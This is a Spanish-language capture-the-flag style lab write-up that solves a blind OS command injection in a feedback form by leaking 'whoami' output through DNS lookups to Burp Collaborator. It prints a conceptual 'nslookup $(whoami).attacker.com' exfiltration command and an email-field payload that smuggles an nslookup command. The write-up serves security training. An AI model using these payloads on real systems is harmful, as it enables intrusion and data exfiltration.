# 5. CI Blind OOB Exfiltración

## 💉 Inyección ciega con exfiltración vía OOB

### 📄 Descripción del laboratorio

La funcionalidad **Submit feedback** es vulnerable a **inyección de comandos del sistema operativo ciega**.

**Características del escenario:**

* ❌ No hay salida en la respuesta HTTP
* ❌ El comando se ejecuta de forma asíncrona
* ❌ No existe un directorio escribible accesible públicamente

🎯 **Objetivo del laboratorio:**

* Ejecutar `whoami`
* Exfiltrar su salida vía **DNS** usando **Burp Collaborator**
* Recuperar el nombre del usuario del sistema para completar el laboratorio

***

### 📚 Teoría

En **blind OS command injection**, cuando:

* No hay output visible
* No hay redirección a archivos públicos

la **exfiltración fuera de banda (OOB)** se convierte en la técnica más fiable.

#### 📌 Exfiltración vía DNS

DNS es especialmente útil porque:

* Está disponible en casi todos los sistemas
* No requiere puertos especiales
* Es muy fiable
* Registra el **nombre completo del subdominio consultado**

La técnica consiste en **inyectar la salida del comando dentro del nombre del dominio**.

Ejemplo conceptual:

```bash
nslookup $(whoami).attacker.com
```

Si `whoami` devuelve:

```
www-data
```

el servidor realizará una consulta DNS a:

```
www-data.attacker.com
```

Ese valor queda registrado en **Burp Collaborator**.

Esto convierte **DNS en un canal de exfiltración de datos**, no solo de detección.

***

### 📝 Práctica

#### 1️⃣ Interceptar el feedback

Accedemos a **Submit feedback**.

Enviamos un formulario cualquiera e interceptamos la petición **POST** con **Burp Suite**.

La petición contiene parámetros como:

* `name`
* `email`
* `subject`
* `message`

***

#### 2️⃣ Confirmar el parámetro vulnerable

Como en los laboratorios anteriores, confirmamos que el parámetro **email** se concatena directamente al comando del sistema.

***

#### 3️⃣ Payload de exfiltración DNS

Inyectamos un comando usando **command substitution**:

```bash
email=test@test.com;nslookup $(whoami)<SUBDOMINIO_COLLABORATOR>
```

Ejemplo real:

```bash
email=test@test.com;nslookup $(whoami).abc123xyz.burpcollaborator.net
```

`$()` ejecuta `whoami` y sustituye su salida directamente en el nombre del dominio.

Enviamos la petición modificada.

***

#### 4️⃣ Verificación en Burp Collaborator

Abrimos el panel de **Burp Collaborator** y revisamos las interacciones DNS registradas.

***

#### 5️⃣ Resultado final

En los logs DNS aparece una consulta como:

```
www-data.abc123xyz.burpcollaborator.net
```

<figure><img src="../../../.gitbook/assets/image (634).png" alt=""><figcaption></figcaption></figure>

Esto nos permite obtener directamente:

```
whoami = www-data
```

Introducimos ese valor en el campo de solución del laboratorio.

✅ **Laboratorio resuelto.**
